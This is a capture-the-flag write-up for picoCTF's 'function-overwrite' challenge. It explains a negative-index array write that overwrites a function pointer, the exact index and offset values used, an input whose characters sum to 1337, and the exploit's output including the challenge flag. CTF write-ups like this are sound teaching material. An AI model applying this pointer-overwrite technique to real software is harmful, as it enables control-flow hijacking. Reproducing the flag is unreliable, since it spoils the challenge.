# function-overwrite

Array Out-of-bounds Exploit

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/function-overwrite/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

PIE is not enabled, so the addresses of `easy_checker` and `hard_checker` do not change per runtime. 

## Concept

The concept is to overwrite the function call to `hard_checker` (which is impossible to pass) with that to `easy_checker`. 

This is possible before the pointer to the text segment is not in the text segment - it is in the read- and writeable data segment, and loaded in (to `esi`) before the call. 

## Performing the Pointer Overwrite

Notice the following declarations in [`vuln.c`](./vuln.c)

```c
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};
```

Due to the order in which they are declared, the 4-byte function pointer is stored before (at a lower address than) the integer array `fun`. Using gdb, we see that it starts 64 bytes before the start of `fun`.  

We also have a way of writing to negative array indexes of `fun`, which is contained in the `vuln` function

```c
printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
scanf("%127s", story);
printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
scanf("%d %d", &num1, &num2);

if (num1 < 10)
{
  fun[num1] += num2;
}
```

So we just need to pass in `-16` as `num1`, and `easy_checker - hard_checker` as `num2`. 

## Passing the Check

To pass the check, the sum of character ASCII values in `story` must equal 1337 (and it has to be over the entire length of `story`, so we can't leave any part uninitialized). We can achieve this with

```python
b'A' * 20 + b'%' * 1
```

since `1337 = 20 * 65 + 37`. 

## Flag

```bash
[+] Opening connection to saturn.picoctf.net on port 51330: Done
[*] hex(exe.symbols.easy_checker)='0x80492fc'
[*] hex(exe.symbols.hard_checker)='0x8049436'
[*] hex(easyminushard)='-0x13a'
b"You're 1337. Here's the flag.\n"
b'picoCTF{0v3rwrit1ng_P01nt3rs_cc9ab5fc}\n'
```
